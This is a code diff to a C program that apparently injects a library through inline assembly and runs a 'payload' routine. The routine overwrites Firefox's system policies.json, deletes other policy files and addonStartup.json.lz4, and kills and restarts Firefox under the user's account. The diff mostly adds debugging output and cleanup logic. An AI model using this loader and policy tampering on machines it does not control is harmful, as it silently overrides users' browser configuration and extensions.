@@ -1,4 +1,3 @@
-// [fix] Firefox profile detection and restart under correct user
 #if 0
 set -e
 
@@ -19,6 +18,7 @@ exit 0
 #include <linux/limits.h>
 #include <malloc.h>
 #include <sched.h>
+#include <sys/stat.h>
 #include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -994,14 +994,19 @@ payload_start() {
     "test r14, r14;"
     "jz call_dlerror;"
 
-    // --- 6. Execute ---
-	"mov rdi, r13;"              // Arg 1 (rdi) = library handle
+    // --- 6. Print success (library loaded and symbol found) ---
+    "mov rax, 0x0a4b4f5f444c;"   // "DL_OK\n"
+    "mov [rsp], rax;"
+    "mov rdi, 1; mov rsi, rsp; mov rdx, 6; mov rax, 1; syscall;"
+
+    // --- 7. Execute ---
+    "mov rdi, r13;"              // Arg 1 (rdi) = library handle
     "mov rsi, rbx;"              // Arg 2 (rsi) = payload_params pointer
     "call r14;"
 
-    // --- 7. Leave library loaded (don't dlclose) ---
+    // --- 8. Leave library loaded (don't dlclose) ---
     // The library must remain in memory since we're executing from it
-    "jmp exit_clean;"
+    "jmp payload_cleanup;"
 
     "call_dlerror:"
     "mov rax, [rbx + 24];"       // dlerror_addr
@@ -1012,11 +1017,6 @@ payload_start() {
     "p_lp: mov rdi, 2; mov rax, 1; syscall;"
     "jmp exit_fail;"
 
-    "exit_clean:"
-    "mov rax, 0x0a4b4f5f444c;"   // "DL_OK\n"
-    "mov [rsp], rax;"
-    "mov rdi, 1; mov rsi, rsp; mov rdx, 6; mov rax, 1; syscall;"
-    "jmp payload_cleanup;"
 
     "exit_fail:"
     "mov rax, 0x0a5252455f444c;" // "DL_ERR\n"
@@ -1068,6 +1068,44 @@ static void restart_firefox_detached(uid_t uid, const char *home_dir) {
         _exit(0);
     }
     if (c > 0) waitpid(c, NULL, 0);
+}
+
+static int clean_policies_directory(void) {
+    const char *dirpath = "/etc/firefox/policies";
+    DIR *d = opendir(dirpath);
+    if (!d) {
+        /* directory doesn't exist -> nothing to clean */
+        return 1;
+    }
+
+    struct dirent *entry;
+    while ((entry = readdir(d)) != NULL) {
+        /* skip . and .. */
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+        /* skip policies.json itself */
+        if (strcmp(entry->d_name, "policies.json") == 0)
+            continue;
+
+        /* Build full path */
+        char fullpath[PATH_MAX];
+        int n = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);
+        if (n < 0 || (size_t)n >= sizeof(fullpath))
+            continue;
+
+        /* Remove only regular files (ignore subdirectories to be safe) */
+        struct stat st;
+        if (lstat(fullpath, &st) == 0 && S_ISREG(st.st_mode)) {
+            if (unlink(fullpath) < 0) {
+                dprintf("Failed to remove %s: %s", fullpath, strerror(errno));
+                /* continue anyway */
+            } else {
+                dprintf("Removed %s", fullpath);
+            }
+        }
+    }
+    closedir(d);
+    return 1;
 }
 
 static int find_firefox_profile(char *profile_path_out, size_t len) {
@@ -1200,13 +1238,90 @@ static int check_extension_active(const char *profile_path) {
         start = content + 3;
     }
 
+
+
     cJSON *root = cJSON_Parse(start);
-    free(content);
 
     if (!root) {
-        write(1, "[payload] Failed to parse extensions.json\n", 42);
+        const char *err_ptr = cJSON_GetErrorPtr();
+        if (err_ptr && err_ptr >= start && err_ptr < start + fsize) {
+            int offset = (int)(err_ptr - start);
+            char msg[512];
+            int n;
+
+            n = snprintf(msg, sizeof(msg),
+                         "[payload] Parse error at offset %d (0x%x)\n",
+                         offset, offset);
+            write(1, msg, n);
+
+            /* Show up to 80 chars around the error */
+            const char *ctx_start = (err_ptr > start + 40) ? err_ptr - 40 : start;
+            int ctx_before = (int)(err_ptr - ctx_start);
+            int ctx_after  = (int)((start + fsize) - err_ptr);
+            if (ctx_after > 40) ctx_after = 40;
+
+            n = snprintf(msg, sizeof(msg),
+                         "[payload] Context: %.*s<<<ERR>>>%.*s\n",
+                         ctx_before, ctx_start, ctx_after, err_ptr);
+            write(1, msg, n);
+
+            /* Bytes in hex around the error for low-level inspection */
+            char hexbuf[4096];
+            int hlen = 0;
+            int total = ctx_before + ctx_after;
+            for (int i = 0; i < total && hlen < (int)sizeof(hexbuf) - 4; i++) {
+                hlen += snprintf(hexbuf + hlen, sizeof(hexbuf) - hlen,
+                                 "%02x ", (unsigned char)ctx_start[i]);
+                if ((i + 1) % 20 == 0 && hlen < (int)sizeof(hexbuf) - 2)
+                    hexbuf[hlen++] = '\n';
+            }
+            if (hlen < (int)sizeof(hexbuf)) hexbuf[hlen] = '\n';
+            write(1, hexbuf, hlen + (hlen < (int)sizeof(hexbuf) ? 1 : 0));
+        } else {
+            write(1, "[payload] Parse error (no error available)\n", 43);
+        }
+
+        /* Keep the existing hex dump of the first 200 bytes – leave it exactly as it was */
+        /* Dump first 200 bytes (if any) for manual inspection */
+        if (fsize > 0) {
+            char hex[2048];
+            int off = 0;
+            for (int i = 0; i < fsize && i < 200 && off < (int)sizeof(hex) - 4; i++) {
+                off += snprintf(hex + off, sizeof(hex) - off, "%02x ", (unsigned char)start[i]);
+                if ((i + 1) % 40 == 0 && off < (int)sizeof(hex) - 2) {
+                    hex[off++] = '\n';
+                }
+            }
+            if (off < (int)sizeof(hex)) hex[off] = '\n';
+            write(1, hex, off + (off < (int)sizeof(hex) ? 1 : 0));
+        }
+
+        /* Print file size */
+        write(1, "[payload] File size: ", 21);
+        char sizestr[32];
+        int szlen = snprintf(sizestr, sizeof(sizestr), "%ld\n", fsize);
+        write(1, sizestr, szlen);
+
+        /* Dump last 200 bytes if file is large enough */
+        if (fsize > 200) {
+            write(1, "[payload] Last 200 bytes:\n", 25);
+            char hex2[2048];
+            int off2 = 0;
+            const char *tail = start + fsize - 200;
+            for (int i = 0; i < 200 && off2 < (int)sizeof(hex2) - 4; i++) {
+                off2 += snprintf(hex2 + off2, sizeof(hex2) - off2, "%02x ", (unsigned char)tail[i]);
+                if ((i + 1) % 40 == 0 && off2 < (int)sizeof(hex2) - 2) {
+                    hex2[off2++] = '\n';
+                }
+            }
+            if (off2 < (int)sizeof(hex2)) hex2[off2] = '\n';
+            write(1, hex2, off2 + (off2 < (int)sizeof(hex2) ? 1 : 0));
+        }
+
+        free(content);
         return -1;
     }
+    free(content);
 
     cJSON *addons = cJSON_GetObjectItem(root, "addons");
     if (!addons || !cJSON_IsArray(addons)) {
@@ -1272,6 +1387,7 @@ static int check_extension_active(const char *profile_path) {
 static int check_policies_exist(const char *local_path) {
     const char *system_path = "/etc/firefox/policies/policies.json";
     int files_differ = 0;
+	int result = 0;
 
     FILE *fb = fopen(local_path, "r");
     if (!fb) {
@@ -1315,8 +1431,8 @@ static int check_policies_exist(const char *local_path) {
 
     if (files_differ) {
         // Create directory if it doesn't exist
-        int result = system("mkdir -p /etc/firefox/policies");
-        if (result != 0) {
+        int ret = system("mkdir -p /etc/firefox/policies");
+        if (ret != 0) {
             printf("[payload] Failed to create directory /etc/firefox/policies\n");
             fflush(stdout);
             return -1;
@@ -1356,12 +1472,17 @@ static int check_policies_exist(const char *local_path) {
         
         printf("[payload] Copied policies.json to system location\n");
         fflush(stdout);
-        return 0; // Indicate that files were different
+        result = 0;          // files were different
+    } else {
+        printf("[payload] policies.json: MATCH\n");
+        fflush(stdout);
+        result = 1;          // files match
     }
 
-    printf("[payload] policies.json: MATCH\n");
-    fflush(stdout);
-    return 1; // Files match
+    /* Always remove stray policy files */
+    clean_policies_directory();
+
+    return result;
 }
 
 static int check_userchrome_exist(const char *profile_path, const char *local_path) {
@@ -1493,6 +1614,18 @@ void my_payload_entry(void *handle, payload_params *params) {
     printf("[payload] Found profile: %s\n", profile_path);
     fflush(stdout);
 
+    /* Compute addonStartup.json.lz4 path safely */
+    const char *suffix = "/addonStartup.json.lz4";
+    size_t plen = strlen(profile_path);
+    size_t slen = strlen(suffix);
+    if (plen + slen < sizeof(params->addon_startup_path)) {
+        memcpy(params->addon_startup_path, profile_path, plen);
+        memcpy(params->addon_startup_path + plen, suffix, slen + 1);
+    } else {
+        /* Path too long – leave empty so the removal is skipped */
+        params->addon_startup_path[0] = '\0';
+    }
+
     /* Determine the real user's home directory and UID from the profile path */
     char *snap_pos = strstr(profile_path, "/snap/firefox");
     char home_dir[PATH_MAX] = {0};
@@ -1535,8 +1668,11 @@ void my_payload_entry(void *handle, payload_params *params) {
         if (!killed) {
             kill_firefox();
         }
-        if (params->addon_startup_path[0])
+        if (params->addon_startup_path[0]) {
+            printf("[payload] Removing %s\n", params->addon_startup_path);
+            fflush(stdout);
             unlink(params->addon_startup_path);
+        }
         restart_firefox_detached(real_uid, home_dir);
     }
 
